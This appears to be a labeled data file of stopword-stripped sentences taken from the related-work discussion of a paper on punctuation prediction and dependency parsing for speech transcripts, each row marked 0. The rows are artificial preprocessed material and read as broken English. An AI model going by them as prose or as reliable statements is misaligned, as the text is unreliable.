", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
 The word-level models integrating local features narrow views input could achieve satisfied performance due limited context information access (Favre et al,0

" Naturally, global contexts required model punctuation prediction, especially long-range dependencies",0
" For instance, English question sentences, ending question mark long-range dependent initial phrases (Lu Ng, 2010), could Figure 1",0

" In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0

" However, scenarios prosodic cues available due inaccessible original raw speech waveforms",0

 Lu Ng (2010) uses dynamic conditional random fields perform sentence boundary sentence type prediction,0
 They achieved promising results English Chinese transcribed speech texts,0
" The work exploits local features, limited capturing long range dependencies punctuation prediction",0
" It natural incorporate global knowledge, syntactic information, improve punctuation prediction performance",0
 Roark et al,0
 (2006) use rich set non-local features including parser scores re-rank full segmentations,0
 Favre et al,0
 (2008) integrate syntactic information PCFG parser log-linear combine local features sentence segmentation,0
" The punctuation prediction works performed post-procedure step parsing, parse tree needs built advance",0
" As parsing stream words transcribed speech text exponentially complex, approaches feasible short input processing",0
" Unlike works, incorporate punctuation prediction parsing process left right input without length limitations",0
" Numerous dependency parsing algorithms proposed natural language processing community, including transition-based graph-based dependency parsing",0
" Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",0
